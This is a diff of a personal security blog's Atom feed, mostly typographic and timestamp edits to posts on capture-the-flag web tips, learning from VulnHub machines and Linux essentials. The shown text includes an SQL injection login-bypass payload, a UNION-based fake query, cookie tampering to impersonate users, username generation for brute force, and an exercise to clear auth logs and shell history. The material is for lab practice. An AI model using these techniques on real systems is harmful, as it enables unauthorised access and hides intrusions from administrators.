@@ -3597,7 +3768,7 @@ This is needed because lot of programs use &#8220;-&#8221; to mean stdin/stdout.
 <ol>
 <li> You may want to use your browser to view the source of the web page. Sometimes, important information is hidden using comments.</li>
 <br>
-<li> It may be helpful to learn how to &#8216;Inspect Elements&#8217; in your browser. It helps you to distinguish each element which might be or not be hidden. </li>
+<li> It may be helpful to learn how to 'Inspect Elements' in your browser. It helps you to distinguish each element which might be or not be hidden. </li>
 <br>
 <li> Some symbols need to be URL Encoded when included in GET requests.
 <br>
@@ -3690,7 +3861,7 @@ This is needed because lot of programs use &#8220;-&#8221; to mean stdin/stdout.
 <br>
 <li>Websites keep track of you (Whether you are login-ed or not) by keeping a cookie for you, check that if the value (if easy and most probably assigned linearly) of cookie can be changed to any user who might already be logined.</li>
 <br>
-<li>If the Login prompt contains SQL query and check contains only one result if (mysqli_num_rows($result) !== 1), then use limit 1 such as admin&#8217; or 1=1 limit 1;#
+<li>If the Login prompt contains SQL query and check contains only one result if (mysqli_num_rows($result) !== 1), then use limit 1 such as admin' or 1=1 limit 1;#
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -3764,7 +3935,7 @@ You have to create a fake query such as
 </span><span class='line'>where  
 </span><span class='line'>The ' closes the username string and 1=0 will always return false, invalidating the first half.
 </span><span class='line'>The union all statement allows us to concatenate two SQL select queries, so we append UNION ALL and then our fake select statement.</span></code></pre></td></tr></table></div></figure>
-Don&#8217;t forget to enter the same password in the password field :P
+Don't forget to enter the same password in the password field :P
 </li>
 <br>
 <li>Perl Script running on a webpage, read <a href="http://www.cgisecurity.com/lib/sips.html">Security Issues in Perl Scripts</a></li>
@@ -3781,7 +3952,7 @@ Don&#8217;t forget to enter the same password in the password field :P
   <entry>
     <title type="html"><![CDATA[Learning From VulnHub]]></title>
     <link href="http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub/"/>
-    <updated>2014-11-03T16:40:21+00:00</updated>
+    <updated>2014-11-03T22:10:21+05:30</updated>
     <id>http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub</id>
     <content type="html"><![CDATA[<p>This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the VulnHub. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilties.</p>
 
@@ -3959,7 +4130,7 @@ If you search for webmin in searchsploit, you would find different exploits avai
 <ul>
 <li>Names? Possible Usernames? Possible Passwords?:
 <br>
-Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible names of the employees working in the company. Now, it is common practise to have username based on your first/last name. It can be based on different combinations such as firstname.lastname or first letter of first name + lastname etc. <a href="https://twitter.com/superkojiman">superkojiman</a> has written a python script named &#8220;namemash.py&#8221; available at <a href="https://gist.githubusercontent.com/superkojiman/11076951/raw/namemash.py">here</a> which could be used to create possible usernames.
+Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible names of the employees working in the company. Now, it is common practise to have username based on your first/last name. It can be based on different combinations such as firstname.lastname or first letter of first name + lastname etc. <a href="https://twitter.com/superkojiman">superkojiman</a> has written a python script named "namemash.py" available at <a href="https://gist.githubusercontent.com/superkojiman/11076951/raw/namemash.py">here</a> which could be used to create possible usernames.
 <br><br>
 However, we still have a large amount of usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
 <ol>
@@ -4001,9 +4172,9 @@ If ftp anonymous login is provided or you have login details, you can download t
   
   <entry>
     <title type="html"><![CDATA[Linux Essentials]]></title>
-    <link href="http://bitvijays.github.io/blog/2014/10/07/linux-essentials/"/>
-    <updated>2014-10-07T23:07:48+01:00</updated>
-    <id>http://bitvijays.github.io/blog/2014/10/07/linux-essentials</id>
+    <link href="http://bitvijays.github.io/blog/2014/10/08/linux-essentials/"/>
+    <updated>2014-10-08T03:37:48+05:30</updated>
+    <id>http://bitvijays.github.io/blog/2014/10/08/linux-essentials</id>
     <content type="html"><![CDATA[<p>This post lists essential commands and concepts which would be helpful to a Linux user. We would cover tools required for programming, system administration. Also, provide some useful tips, tricks and TODO which would help you learn and practice.</p>
 
 <!-- more -->
@@ -4027,20 +4198,26 @@ If ftp anonymous login is provided or you have login details, you can download t
 <span class='line-number'>12</span>
 <span class='line-number'>13</span>
 <span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>vi &lt;filename>           - Open a file to edit in Vi editor.
-</span><span class='line'>Two modes               - Command and Insert Mode. All commands below are in command mode.
-</span><span class='line'>:q                      - Quit.
-</span><span class='line'>:wq                     - Save and close.
-</span><span class='line'>:syntax on              - Turn on Syntax highlighting for C programming and other languages.
-</span><span class='line'>:set number             - Turn on the line numbers.
-</span><span class='line'>:set nonumber           - Turn off the line numbers.
-</span><span class='line'>:u                      - Undo one change.
-</span><span class='line'>dd                      - Delete current line. 
-</span><span class='line'>d$                      - Delete the text from where your cursor is to the end of the line.
-</span><span class='line'>dnd                     - Delete n lines.
-</span><span class='line'>yy                      - Yank or copy current line.
-</span><span class='line'>y$, yny                 - Similar to delete lines.
-</span><span class='line'>p                       - Paste the line in the buffer in to text after the current line.</span></code></pre></td></tr></table></div></figure>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vi &lt;filename>              - Open a file to edit in Vi editor.
+</span><span class='line'>Two modes                  - Command and Insert Mode. All commands below are in command mode.
+</span><span class='line'>:q                         - Quit.
+</span><span class='line'>:wq                        - Save and close.
+</span><span class='line'>:syntax on                 - Turn on Syntax highlighting for C programming and other languages.
+</span><span class='line'>:set number                - Turn on the line numbers.
+</span><span class='line'>:set nonumber              - Turn off the line numbers.
+</span><span class='line'>:set spell spelllang=en_us - Turn spell checking on with spell language as "en_us"
+</span><span class='line'>:set nospell               - Turn spell checking off
+</span><span class='line'>:u                         - Undo one change.
+</span><span class='line'>z=                         - If the cursor is on the word ( which is highlighted with spell check), Vim will suggest a list of alternatives that it thinks may be correct.
+</span><span class='line'>dd                         - Delete current line. 
+</span><span class='line'>d$                         - Delete the text from where your cursor is to the end of the line.
+</span><span class='line'>dnd                        - Delete n lines.
+</span><span class='line'>yy                         - Yank or copy current line.
+</span><span class='line'>y$, yny                    - Similar to delete lines.
+</span><span class='line'>p                          - Paste the line in the buffer in to text after the current line.</span></code></pre></td></tr></table></div></figure>
 Two configurations files which are important:
 <ul>
 <li>.vimrc&nbsp;&nbsp;&nbsp;&nbsp;   - Contains optional runtime configuration settings to initialize Vim when it starts. Example: If you want Vim to have syntax on and line numbers on, whenever you open vi, enter syntax on and set number in this file.</li>
@@ -4070,7 +4247,7 @@ sed - stream editor in Vi is really very useful. It is also a standalone applica
 <li>/etc/bashrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;     - Global system configuration for bash which controls the aliases and functions to be run when bash is executed.</li>
 </ol>
 <br>
-Few Important Variables
+Few important variables
 <ol type="i">
 <li>HISTSIZE&nbsp;&nbsp;&nbsp;&nbsp; - Controls the number of commands to remember in the history command. The default value is 500.</li>
 <li>HISTFILE&nbsp;&nbsp;&nbsp;&nbsp; - Defines the file in which all commands will be logged to. Normally the value for this variable is set to ~/.bash_history. This means that whatever you type in bash will be stored into the value of HISTFILE. It is advisable to leave it undefined, or pipe the output to /dev/null (For privacy reasons).</li>
@@ -4099,7 +4276,7 @@ Few Important Variables
 </span><span class='line'>apt-get purge   "Package Name" - Removes the package as well as the configurations files.
 </span><span class='line'>apt-cache show  "Package name" - Shows what package is used for.
 </span><span class='line'>apt-cache search "Keywords"    - Search package name based on keywords.</span></code></pre></td></tr></table></div></figure>
-Tip: As mostly, updating takes time, you can club all the commands like &#8220;apt-get update && apt-get upgrade && apt-get dist-upgrade && poweroff&#8221;. 
+Tip: As mostly, updating takes time, you can club all the commands like "apt-get update && apt-get upgrade && apt-get dist-upgrade && poweroff". 
 <br>
 <br>
 poweroff would shutdown the system after everything is updated.
@@ -4113,7 +4290,7 @@ poweroff would shutdown the system after everything is updated.
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>dpkg -i &lt;Package>.deb          - install package.
+</pre></td><td class='code'><pre><code class=''><span class='line'>dpkg -i &lt;Package>.deb          - Install package.
 </span><span class='line'>dpkg -r &lt;Package>              - Removes everything except configuration files.
 </span><span class='line'>dpkg -P &lt;Package>              - Removes configurations files too.
 </span><span class='line'>dpkg -l                        - Shows the list of all installed packages.
@@ -4171,7 +4348,7 @@ poweroff would shutdown the system after everything is updated.
 </span><span class='line'>-R, --recursive    : operate on files and directories recursively.
 </span><span class='line'>chmod              : change file mode bits.
 </span><span class='line'>chgrp              : change group ownership.
-</span><span class='line'>SUID bit           : SetUID bit specfies that an executable should run as its owner instead of the user executing it.
+</span><span class='line'>SUID bit           : SetUID bit specifies that an executable should run as its owner instead of the user executing it.
 </span><span class='line'>                   : SUID is mostly commonly used to run an executable as root, allowing users to perform tasks such as changing their passwords.
 </span><span class='line'>         : If there is a flaw in a SUID root executable, you can run arbitrary code as root.</span></code></pre></td></tr></table></div></figure>
 </li>
@@ -4182,7 +4359,7 @@ poweroff would shutdown the system after everything is updated.
 <span class='line-number'>3</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>mount &lt;device> &lt;dir> : Mount a filesystem.
 </span><span class='line'>-r, --read-only      : Mount the filesystem read-only.
-</span><span class='line'>unmount {dir|device} : Umount file systems.</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>unmount {dir|device} : Unmount file systems.</span></code></pre></td></tr></table></div></figure>
 
 Mounting Windows share on Linux
 
@@ -4293,7 +4470,7 @@ Mounting Windows share on Linux
 </span><span class='line'>lspci      : list all pci devices
 </span><span class='line'>lsusb      : list all usb devices
 </span><span class='line'>hal-device : list all the Hardware Abstraction layer devices</span></code></pre></td></tr></table></div></figure></li>
-<li>Debian GNU provides a convenient tool to manage runlevels (to control when services are started and shut down); it&#8217;s called update-rc.d and there are two commonly used invocation methods:
+<li>Debian GNU provides a convenient tool to manage runlevels (to control when services are started and shut down); it's called update-rc.d and there are two commonly used invocation methods:
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>update-rc.d -f &lt;service name> remove : Disabling a service
@@ -4341,7 +4518,7 @@ TODO: <a href="try.github.com">try.github.com</a> 15 mins tutorial.</li>
 <span class='line-number'>5</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>/etc/issue     : Contains the message which is displayed on terminal before login. 
 </span><span class='line'>/etc/motd      : Contains the message which is displayed on terminal after login.
-</span><span class='line'>/proc/cpuinfo  : provides information about cpu.
+</span><span class='line'>/proc/cpuinfo  : provides information about CPU.
 </span><span class='line'>/proc/meminfo  : provides information about memory/ RAM.
 </span><span class='line'>/proc/version  : provides information about the version of your system.</span></code></pre></td></tr></table></div></figure>
 </li>
@@ -4484,7 +4661,7 @@ TODO: <a href="try.github.com">try.github.com</a> 15 mins tutorial.</li>
 </span><span class='line'>tee       : saves output in file as well as forward it.
 </span><span class='line'>touch     : Create zero byte files, mainly used for changing the timestamps of the file.
 </span><span class='line'>make      : If your program source file name is test.c/cpp, then you can directly write make test, this would compile the test.c/cpp program. Remember this it's a faster way.
-</span><span class='line'>stat      : View detailed information about a file, including its name,size, last modified date, and permissons.
+</span><span class='line'>stat      : View detailed information about a file, including its name,size, last modified date, and permissions.
 </span><span class='line'>uniq      : Report or omit repeated lines.
 </span><span class='line'>   -c     : prefix lines by the number of occurrences. (--count)</span></code></pre></td></tr></table></div></figure>
 </li>
@@ -4509,13 +4686,13 @@ TODO: <a href="try.github.com">try.github.com</a> 15 mins tutorial.</li>
 <li> su&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :&nbsp; Change users or become superuser. The difference between su - <username> and su <username> is that former su - would switch to the new user directory. It would also change the environment variable according to the changed user.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>su -c "command" : Specify a command that will be invoked by the shell using its -c.</span></code></pre></td></tr></table></div></figure></li>
-<li>sudo&nbsp;&nbsp; :&nbsp; execute a command as another user. The difference between su and sudo is &#8216;su&#8217; forces you to share your root password to other users whereas &#8216;sudo&#8217; makes it possible to execute system commands without root password. &#8216;sudo&#8217; lets you use your own password to execute system commands i.e. delegates system responsibility without root password.</li>
+<li>sudo&nbsp;&nbsp; :&nbsp; execute a command as another user. The difference between su and sudo is 'su' forces you to share your root password to other users whereas 'sudo' makes it possible to execute system commands without root password. 'sudo' lets you use your own password to execute system commands i.e. delegates system responsibility without root password.</li>
 </ol></li>
 <br>
 <li>Tips and Tricks
 <ul>
 <li>Scan files for a text present in them
-Find a way to scan my entire linux system for all files containing a specific string of text. Just to clarify, I&#8217;m looking for text within the file, not in the file name.
+Find a way to scan my entire linux system for all files containing a specific string of text. Just to clarify, I'm looking for text within the file, not in the file name.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -4543,7 +4720,7 @@ Find a way to scan my entire linux system for all files containing a specific st
 </span><span class='line'>-B &lt;NUM>              : Print NUM lines of trailing context before matching lines.
 </span><span class='line'>-a, --text            : Process a binary file as if it were text; this is equivalent to the --binary-files=text option.</span></code></pre></td></tr></table></div></figure>
 </li>
-<li>We often do mistakes while updating using apt-get which just leaves us with command line access to the system (GUI messed up). Possibly we unintentionally removed some neccessary packages.
+<li>We often do mistakes while updating using apt-get which just leaves us with command line access to the system (GUI messed up). Possibly we unintentionally removed some necessary packages.
 <br>
 <br>
 In this case, look for /var/log/apt/history.log, look for the time around which your system was broken. Copy the removed packages
@@ -4555,9 +4732,9 @@ To reinstall these packages you just need the package name such as
 </pre></td><td class='code'><pre><code class=''><span class='line'>libapt-inst1.5, apt-utils.</span></code></pre></td></tr></table></div></figure>
 
 <ul>
-<li>Step1: Use sed to search for pattern &#8220;), &#8221; and replace it with &#8220;), \n&#8221;. This would separate the packages by new line. Within vi &#8220;:%s/), /\n/g&#8221;</li>
-<li>Step2: Use cut -d &#8220;:&#8221; -f 1 to remove :amd64 and anything after that.</li>
-<li>Step3: Now we have to get them back in one line rather than multiple lines. Within vi &#8220;:%s/\n/ /g&#8221;</li>
+<li>Step1: Use sed to search for pattern "), " and replace it with "), \n". This would separate the packages by new line. Within vi ":%s/), /\n/g"</li>
+<li>Step2: Use cut -d ":" -f 1 to remove :amd64 and anything after that.</li>
+<li>Step3: Now we have to get them back in one line rather than multiple lines. Within vi ":%s/\n/ /g"</li>
 </ul>
 </li>
 <li>Want to keep track of etc directory? 
@@ -4608,7 +4785,8 @@ Keyboard shortcuts
 Searching history
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>Search as you type. Ctrl + r and type the search term;</span></code></pre></td></tr></table></div></figure>
-Read http://www.gnu.org/software/bash/manual/bashref.html#Command-Line-Editing
+Read here more for <a href="http://www.gnu.org/software/bash/manual/bashref.html#Command-Line-Editing">Command Line Editing</a>
+
 </li>
 
 <li>Awk converting to normal output to csv
@@ -4731,10 +4909,10 @@ Non-repudiation is about ensuring that users cannot deny knowledge of sending a 
 <li> Change the messages before login, after login. Remember the escapes sequences used in the /etc/issue.  man agetty lists them.</li>
 <li> Supposed you got access via shell to a linux system and extract some information from it. Create a script
 <ul>
-<li>Create a alice, bob, eve with the password &#8220;password&#8221; HINT: set password using chpasswd, look some examples in google to change from cmdline.</li>
+<li>Create a alice, bob, eve with the password "password" HINT: set password using chpasswd, look some examples in google to change from cmdline.</li>
 <li>Login from eve.</li>
 <li>Copy and preserve all the configuration files from /etc and save it in eve home directory in the folder etc-backup-YYYYMMDD, direct all errors to cp.err</li>
-<li>Change the owner of all the files in the folder just created to bob and the group of all the files to alice and change the permission of all the files to 440 i.e r&#8211;r&#8212;&#8211;
+<li>Change the owner of all the files in the folder just created to bob and the group of all the files to alice and change the permission of all the files to 440 i.e r--r-----
 HINT: would have to be logined as root</li>
 <li>Provide me all the unique shells used by the user present in the system in CAPS. HINT: /etc/passwd file contains all the shells, three four commands would be used.</li>
 <li>Cover your tracks, clear out the /var/log/auth.log (Have a look at this file and create a backup before clearing), clean your terminal history
